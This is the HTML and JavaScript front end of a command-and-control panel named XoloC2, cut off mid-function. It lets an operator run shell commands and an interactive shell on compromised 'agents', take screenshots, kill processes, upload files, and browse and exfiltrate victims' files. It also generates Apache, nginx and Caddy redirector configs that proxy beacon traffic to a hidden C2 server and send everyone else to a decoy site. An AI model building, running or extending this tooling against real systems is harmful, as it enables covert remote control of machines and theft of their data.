<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>XoloC2</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
  <link rel="icon" type="image/png" href="/static/xolo.png">
  <link rel="stylesheet" href="/static/css/style.css">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/xterm@5.3.0/css/xterm.css">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/leaflet@1.9.4/dist/leaflet.min.css">
  <script src="https://cdn.jsdelivr.net/npm/xterm@5.3.0/lib/xterm.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/leaflet@1.9.4/dist/leaflet.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
</head>
<body>
<div class="layout">
  <!-- Sidebar -->
  <aside class="sidebar">
    <div class="sidebar-header">
      <div class="sidebar-logo">
        <img src="/static/xolo.png" alt="XoloC2" style="width:128px;height:128px;border-radius:12px;object-fit:cover;">
      </div>
    </div>
    <nav class="sidebar-nav">
      <button class="nav-item active" onclick="showView('agents')" id="nav-agents">
        <span class="icon">⚡</span> <span data-i18n="nav_sessions">Sessions</span>
      </button>
      <button class="nav-item" onclick="showView('map')" id="nav-map">
        <span class="icon">🗺</span> <span data-i18n="nav_map">Map</span>
      </button>
      <button class="nav-item" onclick="showView('generate')" id="nav-generate">
        <span class="icon">⚙</span> <span data-i18n="nav_generate">Generate Beacon</span>
      </button>
      <button class="nav-item" onclick="showView('redirector')" id="nav-redirector">
        <span class="icon">↪</span> <span data-i18n="nav_redirector">Redirector</span>
      </button>
    </nav>
    <div class="sidebar-footer">
      <button class="nav-item" onclick="showView('settings')" id="nav-settings">
        <span class="icon">⚙</span> <span data-i18n="nav_settings">Settings</span>
      </button>
      <button class="nav-item" onclick="logout()">
        <span class="icon">⏻</span> <span data-i18n="nav_logout">Logout</span>
        <span id="sidebar-user" style="color:var(--text3);font-size:10px;margin-left:auto"></span>
      </button>
    </div>
  </aside>

  <!-- Main -->
  <main class="main">
    <div class="topbar">
      <span class="topbar-title" id="topbar-title">Sessions</span>
      <div style="display:flex;align-items:center;gap:16px">
        <button id="lang-en-btn" onclick="setLang('en')" title="English" style="background:none;border:none;cursor:pointer;font-size:16px;padding:2px;line-height:1;opacity:1">🇺🇸</button>
        <button id="lang-es-btn" onclick="setLang('es')" title="Español" style="background:none;border:none;cursor:pointer;font-size:16px;padding:2px;line-height:1;opacity:0.4">🇲🇽</button>
        <span id="ws-indicator" title="WebSocket" style="font-size:10px;color:var(--text3)">● WS</span>
        <span id="topbar-status" style="color:var(--text3);font-size:11px"></span>
        <span id="session-timer" style="font-size:11px;color:var(--text3);font-family:var(--font-mono)" title="Session expires in"></span>
      </div>
    </div>

    <div class="content" id="content">
      <!-- Dynamic content rendered here -->
    </div>
  </main>
</div>

<!-- Toast container -->
<div id="toast-container" style="position:fixed;bottom:24px;right:24px;z-index:9999;display:flex;flex-direction:column;gap:8px;pointer-events:none"></div>

<!-- Upload File Modal -->
<div class="modal-overlay" id="upload-modal">
  <div class="modal">
    <h2 data-i18n="upload_title">↑ Upload File to Agent</h2>
    <p style="color:var(--text3);font-size:11px;margin-bottom:16px;line-height:1.5" data-i18n="upload_desc">
      The file will be staged on the server. The beacon will download and write it to the destination path on its next check-in.
    </p>
    <div class="error-msg" id="upload-error"></div>
    <div class="form-group">
      <label data-i18n="upload_file_label">File</label>
      <input type="file" id="upload-file" style="color:var(--text);background:var(--bg3);border:1px solid var(--border);border-radius:6px;padding:8px;width:100%">
    </div>
    <div class="form-group">
      <label data-i18n="upload_dest_label">Destination path on target</label>
      <input type="text" id="upload-dest" placeholder="/tmp/file.txt">
    </div>
    <div style="display:flex;gap:10px;justify-content:flex-end;margin-top:8px">
      <button class="btn btn-ghost" onclick="closeUploadModal()" data-i18n="upload_cancel">Cancel</button>
      <button class="btn" onclick="submitUpload()" data-i18n="upload_submit">↑ Upload</button>
    </div>
  </div>
</div>

<!-- PTY Shell Modal -->
<div class="modal-overlay" id="pty-modal">
  <div class="modal" style="max-width:900px;width:95vw;max-height:92vh;padding:16px">
    <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:12px">
      <h2 style="margin:0;font-size:14px" data-i18n="pty_title">🖥 Interactive Shell</h2>
      <div style="display:flex;gap:10px;align-items:center">
        <span id="pty-status" style="font-size:11px;color:var(--text3)" data-i18n="pty_connecting">Connecting...</span>
        <button class="btn btn-sm btn-ghost" onclick="closePtyShell()" data-i18n="pty_close">✕ Close</button>
      </div>
    </div>
    <div id="pty-terminal" style="height:500px;background:#0d0d0d;border-radius:6px;overflow:hidden;padding:4px"></div>
  </div>
</div>

<!-- Change Password Modal -->
<div class="modal-overlay" id="pw-modal">
  <div class="modal">
    <h2 data-i18n="cpw_title">Change Password</h2>
    <div class="error-msg" id="pw-modal-error"></div>
    <div class="form-group">
      <label data-i18n="cpw_current">Current Password</label>
      <input type="password" id="pm-current">
    </div>
    <div class="form-group">
      <label data-i18n="cpw_new">New Password (min 12 chars)</label>
      <input type="password" id="pm-new">
    </div>
    <div class="form-group">
      <label data-i18n="cpw_confirm">Confirm New Password</label>
      <input type="password" id="pm-confirm">
    </div>
    <div style="display:flex;gap:10px;justify-content:flex-end;margin-top:8px">
      <button class="btn btn-ghost" onclick="closePwModal()" data-i18n="cpw_cancel">Cancel</button>
      <button class="btn" onclick="submitChangePw()" data-i18n="cpw_submit">Change</button>
    </div>
  </div>
</div>

let _lang = localStorage.getItem('xolo_lang') || 'en';
let _tz   = localStorage.getItem('xolo_tz')   || 'America/Mexico_City';

function t(key) {
  return (LANG[_lang] && LANG[_lang][key]) || (LANG.en && LANG.en[key]) || key;
}

function setLang(lang) {
  _lang = lang;
  localStorage.setItem('xolo_lang', lang);
  const enBtn = document.getElementById('lang-en-btn');
  const esBtn = document.getElementById('lang-es-btn');
  if (enBtn) enBtn.style.opacity = lang === 'en' ? '1' : '0.4';
  if (esBtn) esBtn.style.opacity = lang === 'es' ? '1' : '0.4';
  applyStaticTranslations();
  showView(currentView, currentView === 'session' ? currentAgentId : undefined);
}

function applyStaticTranslations() {
  document.querySelectorAll('[data-i18n]').forEach(el => {
    el.textContent = t(el.getAttribute('data-i18n'));
  });
  // Sync PTY status span if not currently connecting
  const ptyStatus = document.getElementById('pty-status');
  if (ptyStatus && ptyStatus.textContent !== '') {
    const key = ptyStatus.dataset.state === 'connected' ? 'pty_shell' : 'pty_connecting';
    ptyStatus.textContent = t(key);
  }
}

// ── Auth helpers ────────────────────────────────────────
const TOKEN_KEY = 'xolo_token';

function getToken() { return localStorage.getItem(TOKEN_KEY); }

function authHeaders() {
  return { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + getToken() };
}

async function apiFetch(path, opts = {}) {
  const res = await fetch(path, { ...opts, headers: authHeaders() });
  if (res.status === 401) { logout(); return null; }
  return res;
}

function logout() {
  localStorage.removeItem(TOKEN_KEY);
  localStorage.removeItem('xolo_exp');
  window.location.href = '/login';
}

// ── Session timer ────────────────────────────────────────
function updateSessionTimer() {
  const exp = parseInt(localStorage.getItem('xolo_exp') || '0', 10) * 1000;
  if (!exp) return;
  const rem = exp - Date.now();
  if (rem <= 0) { logout(); return; }
  const h = Math.floor(rem / 3600000);
  const m = Math.floor((rem % 3600000) / 60000);
  const s = Math.floor((rem % 60000) / 1000);
  const el = document.getElementById('session-timer');
  if (!el) return;
  el.textContent = h > 0 ? `⏱ ${h}h ${m}m` : `⏱ ${m}m ${String(s).padStart(2,'0')}s`;
  el.style.color = rem < 300000 ? 'var(--danger)' : 'var(--text3)';
}
setInterval(updateSessionTimer, 1000);
updateSessionTimer();

// ── Toast notifications ───────────────────────────────────
function showToast(msg, type = 'info') {
  const container = document.getElementById('toast-container');
  if (!container) return;
  const el = document.createElement('div');
  el.style.cssText = `background:var(--bg2);border:1px solid ${
    type === 'success' ? 'var(--online)' :
    type === 'warning' ? 'var(--warning)' :
    type === 'danger'  ? 'var(--danger)'  : 'var(--border)'
  };border-radius:8px;padding:10px 14px;font-size:12px;color:var(--text);pointer-events:auto;box-shadow:0 4px 20px rgba(0,0,0,0.4);min-width:220px;max-width:320px;line-height:1.5`;
  el.textContent = msg;
  container.appendChild(el);
  setTimeout(() => el.style.opacity = '0', 3500);
  setTimeout(() => el.remove(), 4000);
}

// ── WebSocket ────────────────────────────────────────────
let _ws = null;
let _wsRetry = 1000;

function connectWS() {
  const token = getToken();
  if (!token) return;
  const proto = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
  _ws = new WebSocket(`${proto}//${window.location.host}/ws?token=${encodeURIComponent(token)}`);

  _ws.onopen = () => {
    _wsRetry = 1000;
    const ind = document.getElementById('ws-indicator');
    if (ind) { ind.style.color = 'var(--online)'; ind.title = 'WebSocket conectado'; }
  };

  _ws.onmessage = (event) => {
    try {
      const msg = JSON.parse(event.data);
      if (msg.type === 'agent_checkin') {
        if (currentView === 'agents') refreshAgentList();
        if (msg.is_new) showToast(`⚡ Nuevo agente: ${msg.hostname}`, 'success');
      } else if (msg.type === 'task_result') {
        if (currentView === 'session' && currentAgentId === msg.agent_id) {
          refreshTaskResults(msg.agent_id);
        }
      } else if (msg.type === 'pty_output') {
        if (_ptyTerm && msg.session_id === _ptySessId && msg.data) {
          try {
            _ptyTerm.write(Uint8Array.from(atob(msg.data), c => c.charCodeAt(0)));
          } catch (_) {}
        }
      }
    } catch (_) {}
  };

  _ws.onclose = () => {
    const ind = document.getElementById('ws-indicator');
    if (ind) { ind.style.color = 'var(--text3)'; ind.title = 'WebSocket reconectando...'; }
    setTimeout(connectWS, Math.min(_wsRetry, 30000));
    _wsRetry = Math.min(_wsRetry * 2, 30000);
  };

  // Keep-alive ping every 20s
  setInterval(() => { if (_ws && _ws.readyState === 1) _ws.send('ping'); }, 20000);
}

// ── Views ────────────────────────────────────────────────
function showView(view, agentId) {
  clearPolling();
  currentView = view;
  currentAgentId = agentId || null;

  // Nav highlight
  document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));
  const navEl = document.getElementById('nav-' + (view === 'session' ? 'agents' : view));
  if (navEl) navEl.classList.add('active');

  if (view === 'agents') {
    document.getElementById('topbar-title').textContent = t('title_sessions');
    renderAgentsView();
    pollTimer = setInterval(refreshAgentList, 30000); // WS handles real-time; this is fallback
  } else if (view === 'session') {
    document.getElementById('topbar-title').textContent = 'Session: ' + agentId.slice(0, 8) + '...';
    renderSessionView(agentId);
  } else if (view === 'map') {
    document.getElementById('topbar-title').textContent = t('title_map');
    renderMapView();
  } else if (view === 'generate') {
    document.getElementById('topbar-title').textContent = t('title_generate');
    renderGenerateView();
  } else if (view === 'redirector') {
    document.getElementById('topbar-title').textContent = t('title_redirector');
    renderRedirectorView();
  } else if (view === 'settings') {
    document.getElementById('topbar-title').textContent = t('title_settings');
    renderSettingsView();
  }
}

function clearPolling() {
  if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
  if (agentPollTimer) { clearInterval(agentPollTimer); agentPollTimer = null; }
  if (_mapTimer) { clearInterval(_mapTimer); _mapTimer = null; }
  if (_leafletMap) { _leafletMap.remove(); _leafletMap = null; }
  // Restore content padding if it was removed for the map
  const content = document.getElementById('content');
  if (content) { content.style.padding = ''; content.style.overflow = ''; }
}

function _exportFilterCmd(cmd) {
  // Returns null to skip, or a human-readable label
  if (!cmd) return null;
  if (cmd.startsWith('__ls__:'))       return null;
  if (cmd.startsWith('__pty__:'))      return null;
  if (cmd === '__pty_tick__')          return null;
  if (cmd === '__tunnel_tick__')       return null;
  if (cmd.startsWith('__upload__:')) {
    const p = cmd.split(':', 3);
    return `[UPLOAD] ${p[1]} → ${p[2] || '?'}`;
  }
  if (cmd.startsWith('__download__:')) {
    return `[DOWNLOAD] ${cmd.slice(13)}`;
  }
  return cmd;
}

async function exportTasks(agentId, format) {
  const res = await apiFetch('/api/agents/' + agentId + '/tasks');
  if (!res || !res.ok) return;
  const rawTasks = await res.json();

  // Filter internal protocol commands
  const tasks = rawTasks
    .map(t => ({ ...t, _label: _exportFilterCmd(t.command) }))
    .filter(t => t._label !== null);

  let content, filename, mime;
  if (format === 'json') {
    content = JSON.stringify(tasks.map(({ _label, ...t }) => ({ ...t, command: _label })), null, 2);
    filename = `tasks_${agentId.slice(0,8)}.json`;
    mime = 'application/json';
  } else {
    content = tasks.map(t => [
      `[${fmtDate(t.created_at)}] CMD: ${t._label}`,
      `STATUS: ${t.status}`,
      t.output && !t.output.startsWith('__b64file__') ? `OUTPUT:\n${t.output}` : '(binary file)',
      '─'.repeat(60),
    ].join('\n')).join('\n\n');
    filename = `tasks_${agentId.slice(0,8)}.txt`;
    mime = 'text/plain';
  }

  const blob = new Blob([content], { type: mime });
  const a = document.createElement('a');
  a.href = URL.createObjectURL(blob);
  a.download = filename;
  a.click();
}

async function loadTaskHistory(agentId) {
  const res = await apiFetch('/api/agents/' + agentId + '/tasks');
  if (!res || !res.ok) return;
  const tasks = await res.json();

  // Show last 20 tasks, oldest first
  taskHistory = tasks.slice(0, 20).reverse();
  renderTerminal();
}

async function refreshTaskResults(agentId) {
  if (currentView !== 'session' || currentAgentId !== agentId) return;

  const pending = taskHistory.filter(t => t.status === 'pending' || t.status === 'running');
  if (pending.length === 0) {
    // Still refresh agent info
    await loadAgentInfo(agentId);
    return;
  }

  for (const t of pending) {
    const res = await apiFetch(`/api/agents/${agentId}/tasks/${t.id}`);
    if (!res || !res.ok) continue;
    const updated = await res.json();
    const idx = taskHistory.findIndex(x => x.id === t.id);
    if (idx >= 0) taskHistory[idx] = updated;
  }

  renderTerminal();
  await loadAgentInfo(agentId);
}

function renderTerminal() {
  const out = document.getElementById('term-output');
  if (!out) return;

  const intro = `<div style="color:var(--text3);font-size:11px;margin-bottom:10px">
    ${t('connected_msg')}<br>
    ${t('builtin_label')} <span style="color:var(--accent)">shell &lt;cmd&gt;</span> | <span style="color:var(--accent)">info</span> | <span style="color:var(--accent)">sleep &lt;seconds&gt;</span>
  </div>`;

  const entries = taskHistory.map(t => {
    // Friendly label for internal commands
    let displayCmd = t.command;
    if (t.command.startsWith('__upload__:')) {
      const parts = t.command.split(':');
      displayCmd = `upload ${parts[1]} → ${parts[2]}`;
    }

    let outputHtml;
    if (t.status === 'pending') {
      outputHtml = `<span class="cmd-output pending">[ waiting for beacon... ]</span>`;
    } else if (t.status === 'running') {
      outputHtml = `<span class="cmd-output running">[ executing... ]</span>`;
    } else if (t.output && t.output.startsWith('__b64file__:')) {
      const parts = t.output.split(':');
      const fname = parts[1];
      const b64data = parts.slice(2).join(':');
      const agentId = currentAgentId;
      const isImage = /\.(png|jpg|jpeg|gif|bmp|webp)$/i.test(fname);
      const thumbHtml = isImage
        ? `<img src="data:image/png;base64,${b64data}"
               style="max-width:280px;max-height:160px;border-radius:6px;border:1px solid var(--border);
                      cursor:pointer;margin-top:6px;display:block"
               onclick="this.style.maxWidth=this.style.maxWidth==='100%'?'280px':'100%'"
               title="Click para ampliar">`
        : '';
      outputHtml = `
        <div style="padding:6px 0">
          <div style="display:flex;align-items:center;gap:10px">
            <span style="color:var(--accent2)">📥 ${escapeHtml(fname)}</span>
            <button class="btn btn-sm" onclick="downloadExfil('${escapeHtml(agentId)}','${escapeHtml(t.id)}','${escapeHtml(fname)}')">↓ Download</button>
          </div>
          ${thumbHtml}
        </div>`;
    } else if (t.status === 'error') {
      outputHtml = `<div class="cmd-output error">${escapeHtml(t.output || '(error)')}</div>`;
    } else {
      outputHtml = `<div class="cmd-output">${escapeHtml(t.output || '(no output)')}</div>`;
    }

    return `<div class="cmd-entry">
      <div class="cmd-prompt">❯ <span class="host">${escapeHtml(displayCmd)}</span></div>
      ${outputHtml}
    </div>`;
  }).join('');

  out.innerHTML = intro + entries;
  out.scrollTop = out.scrollHeight;
}

function clearTerminal() {
  taskHistory = [];

const CMD_HISTORY_MAX = 500;
let cmdHistory = [];
let cmdHistoryIdx = -1;

function historyKey(agentId) {
  return `xolo_history_${agentId}`;
}

function loadCmdHistory(agentId) {
  try {
    const raw = localStorage.getItem(historyKey(agentId));
    cmdHistory = raw ? JSON.parse(raw) : [];
  } catch {
    cmdHistory = [];
  }
  cmdHistoryIdx = -1;
}

function saveCmdHistory(agentId) {
  try {
    // Keep last CMD_HISTORY_MAX entries
    const trimmed = cmdHistory.slice(-CMD_HISTORY_MAX);
    localStorage.setItem(historyKey(agentId), JSON.stringify(trimmed));
  } catch {}
}

async function handleTermKey(event, agentId) {
  const input = document.getElementById('term-input');

  if (event.key === 'ArrowUp') {
    event.preventDefault();
    if (cmdHistoryIdx < cmdHistory.length - 1) {
      cmdHistoryIdx++;
      input.value = cmdHistory[cmdHistory.length - 1 - cmdHistoryIdx] || '';
    }
    return;
  }
  if (event.key === 'ArrowDown') {
    event.preventDefault();
    if (cmdHistoryIdx > 0) {
      cmdHistoryIdx--;
      input.value = cmdHistory[cmdHistory.length - 1 - cmdHistoryIdx] || '';
    } else {
      cmdHistoryIdx = -1;
      input.value = '';
    }
    return;
  }

  if (event.key !== 'Enter') return;

  const cmd = input.value.trim();
  if (!cmd) return;

  input.value = '';
  cmdHistoryIdx = -1;

  // Client-side commands (not sent to beacon)
  if (cmd === '/help') {
    const helpHtml = `<div class="cmd-entry">
      <div class="cmd-prompt">❯ <span class="host">/help</span></div>
      <div class="cmd-output" style="line-height:2">
        <span style="color:var(--accent);font-weight:600">Built-in beacon commands</span><br>
        <span style="color:var(--accent2)">info</span>                — agente info (ID, OS, IP, user, PID, CWD)<br>
        <span style="color:var(--accent2)">screenshot</span>          — captura pantalla y descarga<br>
        <span style="color:var(--accent2)">ps</span>                  — lista procesos activos<br>
        <span style="color:var(--accent2)">kill &lt;pid&gt;</span>          — termina un proceso por PID<br>
        <span style="color:var(--accent2)">download &lt;/ruta&gt;</span>    — exfiltra archivo al operador<br>
        <span style="color:var(--accent2)">sleep &lt;segundos&gt;</span>    — cambia intervalo de checkin<br>
        <span style="color:var(--accent2)">shell &lt;cmd&gt;</span>         — ejecuta comando de shell explícitamente<br>
        <span style="color:var(--text3)">cualquier otro texto</span>  — ejecutado como shell command directo<br>
        <br>
        <span style="color:var(--accent);font-weight:600">Operador (upload)</span><br>
        <span style="color:var(--accent2)">↑ Upload</span>            — sube archivo desde tu PC al agente<br>
        <br>
        <span style="color:var(--accent);font-weight:600">Navegación</span><br>
        <span style="color:var(--accent2)">↑ ↓</span>                 — historial de comandos<br>
        <span style="color:var(--accent2)">/help</span>               — muestra este menú<br>
        <span style="color:var(--accent2)">/clear</span>              — limpia la terminal<br>
      </div>
    </div>`;
    const out = document.getElementById('term-output');
    if (out) { out.innerHTML += helpHtml; out.scrollTop = out.scrollHeight; }
    return;
  }

  if (cmd === '/clear') {
    clearTerminal();
    return;
  }

  // Avoid consecutive duplicate entries (like bash HISTCONTROL=ignoredups)
  if (cmdHistory[cmdHistory.length - 1] !== cmd) {
    cmdHistory.push(cmd);
    saveCmdHistory(agentId);
  }

  const res = await apiFetch('/api/agents/' + agentId + '/tasks', {
    method: 'POST',
    body: JSON.stringify({ command: cmd }),
  });

  if (!res || !res.ok) return;
  const task = await res.json();

  // API returns task_id, normalize to id so refreshTaskResults can find it
  taskHistory.push({ id: task.task_id, command: cmd, status: task.status, output: '' });
  renderTerminal();
}

let _fbAgentId = null;
let _fbCurrentPath = null;
let _fbHistory = [];
let _fbHistoryIdx = -1;

// Returns parent path or null if already at root. Handles both Windows and Unix.
function fbGetParent(path) {
  if (path.includes('\\')) {
    // Windows path
    const idx = path.lastIndexOf('\\');
    if (idx <= 2) return null;           // at drive root: C:\ (backslash at index 2)
    const parent = path.substring(0, idx);
    return /^[A-Za-z]:$/.test(parent) ? parent + '\\' : parent;
  } else {
    if (path === '/') return null;
    const idx = path.lastIndexOf('/');
    if (idx === 0) return '/';
    return path.substring(0, idx);
  }
}

function _fbUpdateNavButtons() {
  const backBtn = document.getElementById('fb-back');
  const fwdBtn  = document.getElementById('fb-fwd');
  if (backBtn) backBtn.disabled = _fbHistoryIdx <= 0;
  if (fwdBtn)  fwdBtn.disabled  = _fbHistoryIdx >= _fbHistory.length - 1;
}

function fbBack() {
  if (_fbHistoryIdx > 0) {
    _fbHistoryIdx--;
    fbNavigate(_fbHistory[_fbHistoryIdx], false);
  }
}

function fbForward() {
  if (_fbHistoryIdx < _fbHistory.length - 1) {
    _fbHistoryIdx++;
    fbNavigate(_fbHistory[_fbHistoryIdx], false);
  }
}

async function openFileBrowser(agentId) {
  _fbAgentId = agentId;
  _fbHistory = [];
  _fbHistoryIdx = -1;
  const res = await apiFetch('/api/agents/' + agentId);
  const agent = res && res.ok ? await res.json() : {};
  const isWin = (agent.os_info || '').toLowerCase().includes('windows');
  _fbCurrentPath = agent.cwd || (isWin ? 'C:\\' : '/');
  showFileBrowserPanel(agentId);
}

async function fbNavigate(path, addToHistory = true) {
  if (!_fbAgentId || !path) return;
  path = path.trim();
  if (addToHistory) {
    // Truncate any forward history, then push
    _fbHistory = _fbHistory.slice(0, _fbHistoryIdx + 1);
    _fbHistory.push(path);
    _fbHistoryIdx = _fbHistory.length - 1;
  }
  _fbCurrentPath = path;
  const pathInput = document.getElementById('fb-path-input');
  if (pathInput) pathInput.value = path;
  _fbUpdateNavButtons();

  const fbContent = document.getElementById('fb-content');
  if (fbContent) fbContent.innerHTML = `<div style="color:var(--text3);font-size:12px">${_lang==='es'?'Listando...':'Listing...'}</div>`;

  const r = await apiFetch('/api/agents/' + _fbAgentId + '/tasks', {
    method: 'POST',
    body: JSON.stringify({ command: `__ls__:${path}` }),
  });
  if (!r || !r.ok) { if (fbContent) fbContent.innerHTML = `<div style="color:var(--danger)">Error</div>`; return; }
  const task = await r.json();

  let attempts = 0;
  const poll = setInterval(async () => {
    attempts++;
    if (attempts > 30) { clearInterval(poll); return; }
    const tr = await apiFetch(`/api/agents/${_fbAgentId}/tasks/${task.task_id}`);
    if (!tr || !tr.ok) return;
    const td = await tr.json();
    if (td.status !== 'done' && td.status !== 'error') return;
    clearInterval(poll);
    renderFileListing(td.output, _fbAgentId);
  }, 1500);
}

function renderFileListing(output, agentId) {
  const fbContent = document.getElementById('fb-content');
  if (!fbContent) return;
  if (!output || output.startsWith('Error')) {
    fbContent.innerHTML = `<div style="color:var(--danger);font-size:12px">${escapeHtml(output || 'Error listing directory')}</div>`;
    return;
  }
  let data;
  try { data = JSON.parse(output); } catch { data = null; }
  if (!data || !data.entries) {
    fbContent.innerHTML = `<div style="color:var(--danger);font-size:12px">${escapeHtml(output)}</div>`;
    return;
  }
  const sep = data.path.includes('\\') ? '\\' : '/';
  const parentPath = fbGetParent(data.path);

  // Build rows — use data-* attrs so Windows backslashes are never mis-parsed as JS escapes
  const parentRow = parentPath !== null ? `
    <tr>
      <td colspan="3">
        <button class="btn btn-sm btn-ghost" style="font-family:var(--font-mono);font-size:11px;width:100%;text-align:left"
          data-path="${escapeHtml(parentPath)}" onclick="fbNavigate(this.dataset.path)">📁 ..</button>
      </td>
    </tr>` : '';

  const entryRows = data.entries.map(e => {
    const fullPath = data.path.endsWith(sep) ? data.path + e.name : data.path + sep + e.name;
    const icon = e.type === 'dir' ? '📁' : '📄';
    const sizeStr = e.type === 'dir' ? '—' : formatSize(e.size);
    return `<tr>
      <td>
        ${e.type === 'dir'
          ? `<button class="btn btn-sm btn-ghost" style="font-family:var(--font-mono);font-size:11px;text-align:left;width:100%;justify-content:flex-start"
              data-path="${escapeHtml(fullPath)}" onclick="fbNavigate(this.dataset.path)">${icon} ${escapeHtml(e.name)}</button>`
          : `<span style="font-family:var(--font-mono);font-size:11px;color:var(--text2)">${icon} ${escapeHtml(e.name)}</span>`
        }
      </td>
      <td style="text-align:right;color:var(--text3);font-family:var(--font-mono);font-size:11px">${sizeStr}</td>
      <td style="text-align:right">
        ${e.type !== 'dir'
          ? `<button class="btn btn-sm btn-ghost" style="padding:2px 8px;font-size:10px"
              data-agent="${escapeHtml(agentId)}" data-path="${escapeHtml(fullPath)}" data-name="${escapeHtml(e.name)}"
              onclick="fbDownload(this.dataset.agent, this.dataset.path, this.dataset.name)">⬇</button>`
          : ''}
      </td>
    </tr>`;
  }).join('');

  fbContent.innerHTML = `
    <table style="width:100%;font-size:12px">
      <thead>
        <tr>
          <th style="text-align:left">${_lang==='es'?'Nombre':'Name'}</th>
          <th style="width:90px;text-align:right">${_lang==='es'?'Tamaño':'Size'}</th>
          <th style="width:60px"></th>
        </tr>
      </thead>
      <tbody>${parentRow}${entryRows}</tbody>
    </table>`;
}

async function fbDownload(agentId, fullPath, filename) {
  const r = await apiFetch('/api/agents/' + agentId + '/tasks', {
    method: 'POST',
    body: JSON.stringify({ command: `download ${fullPath}` }),
  });
  if (!r || !r.ok) { showToast('Error', 'danger'); return; }
  const task = await r.json();
  showToast(`⬇ ${_lang==='es'?'Descargando':'Downloading'} ${filename}...`, 'info');
  // Poll and auto-download when done
  let attempts = 0;
  const poll = setInterval(async () => {
    attempts++;
    if (attempts > 40) { clearInterval(poll); showToast('Timeout', 'warning'); return; }
    const tr = await apiFetch(`/api/agents/${agentId}/tasks/${task.task_id}`);
    if (!tr || !tr.ok) return;
    const td = await tr.json();
    if (td.status !== 'done' && td.status !== 'error') return;
    clearInterval(poll);
    if (td.status === 'error' || !td.output?.startsWith('__b64file__:')) {
      showToast(`✗ ${_lang==='es'?'Error al descargar':'Download error'}`, 'danger'); return;
    }
    await downloadExfil(agentId, task.task_id, filename);
    showToast(`✓ ${filename}`, 'success');
  }, 1500);
}

function formatSize(bytes) {
  if (bytes === 0) return '0 B';
  if (bytes < 1024) return bytes + ' B';
  if (bytes < 1048576) return (bytes / 1024).toFixed(1) + ' KB';
  if (bytes < 1073741824) return (bytes / 1048576).toFixed(1) + ' MB';
  return (bytes / 1073741824).toFixed(1) + ' GB';
}

function generateRedirectorConfig(type) {
  const c2    = document.getElementById('rd-c2').value.trim() || 'C2_IP:8443';
  const domain = document.getElementById('rd-domain').value.trim() || 'redirector.example.com';
  const decoy  = document.getElementById('rd-decoy').value.trim() || 'https://www.microsoft.com/';
  const path   = document.getElementById('rd-path').value.trim().replace(/\/$/, '') || '/api/beacon';
  const proto  = window.location.protocol === 'https:' ? 'https' : 'http';

  let config = '';
  let title  = '';

  if (type === 'apache') {
    title = 'Apache 2.4 — VirtualHost';
    config = `<VirtualHost *:80>
    ServerName ${domain}
    Redirect permanent / https://${domain}/
</VirtualHost>

<VirtualHost *:443>
    ServerName ${domain}

    SSLEngine on
    SSLCertificateFile    /etc/letsencrypt/live/${domain}/fullchain.pem
    SSLCertificateKeyFile /etc/letsencrypt/live/${domain}/privkey.pem

    SSLProxyEngine on
    SSLProxyVerify none
    SSLProxyCheckPeerCN off
    SSLProxyCheckPeerName off

    ProxyRequests Off
    ProxyPreserveHost Off

    RewriteEngine On

    # Forward beacon traffic to real C2
    RewriteCond %{REQUEST_URI} ^${path}(.*)$ [NC]
    RewriteRule ^(.*)$ ${proto}://${c2}%{REQUEST_URI} [P,L]

    # Everything else → decoy
    RewriteRule ^(.*)$ ${decoy} [R=302,L]

    ErrorLog  /var/log/apache2/${domain}-error.log
    CustomLog /var/log/apache2/${domain}-access.log combined
</VirtualHost>`;
  } else if (type === 'nginx') {
    title = 'nginx — server block';
    config = `server {
    listen 80;
    server_name ${domain};
    return 301 https://$host$request_uri;
}

server {
    listen 443 ssl;
    server_name ${domain};

    ssl_certificate     /etc/letsencrypt/live/${domain}/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/${domain}/privkey.pem;

    # Forward beacon traffic to real C2
    location ~ ^${path}(/.*)?$ {
        proxy_pass          ${proto}://${c2};
        proxy_ssl_verify    off;
        proxy_set_header    Host              $host;
        proxy_set_header    X-Real-IP         $remote_addr;
        proxy_set_header    X-Forwarded-For   $proxy_add_x_forwarded_for;
        proxy_read_timeout  60s;
    }

    # Everything else → decoy
    location / {
        return 302 ${decoy};
    }

    access_log /var/log/nginx/${domain}-access.log;
    error_log  /var/log/nginx/${domain}-error.log;
}`;
  } else if (type === 'caddy') {
    title = 'Caddyfile';
    config = `${domain} {
    # Forward beacon traffic to real C2
    @beacon path_regexp beacon ^${path}(/.*)?$
    reverse_proxy @beacon ${proto}://${c2} {
        transport http {
            tls_insecure_skip_verify
        }
    }

    # Everything else → decoy
    redir * ${decoy} 302
}`;
  }

  document.getElementById('rd-output-title').textContent = title;
  document.getElementById('rd-code').textContent = config;
  document.getElementById('rd-output').style.display = 'block';
}

function copyRedirector() {
  const code = document.getElementById('rd-code').textContent;
  navigator.clipboard.writeText(code).then(() => {
    const btn = document.getElementById('rd-copy-btn');
    btn.textContent = '✓ Copied!';
    setTimeout(() => btn.textContent = '⎘ Copy', 2000);
  });
}

function showSettingsTab(tab) {
  document.querySelectorAll('.st-tab').forEach(b => b.classList.remove('active'));
  document.querySelectorAll('.st-panel').forEach(el => el.style.display = 'none');
  const btn = document.getElementById('stab-' + tab);
  const panel = document.getElementById('stpanel-' + tab);
  if (btn) btn.classList.add('active');
  if (panel) panel.style.display = '';
}

let _mfaSetupSecret = null;

async function loadMfaStatus() {
  const res = await apiFetch('/api/settings/mfa/status');
  if (!res || !res.ok) return;
  const { enabled } = await res.json();
  const badge = document.getElementById('mfa-badge');
  const btn   = document.getElementById('mfa-toggle-btn');
  if (!badge || !btn) return;
  if (enabled) {
    badge.innerHTML = `<span style="color:var(--online)">${t('mfa_enabled_badge')}</span>`;
    btn.textContent = t('mfa_deactivate');
    btn.className = 'btn btn-sm btn-danger';
  } else {
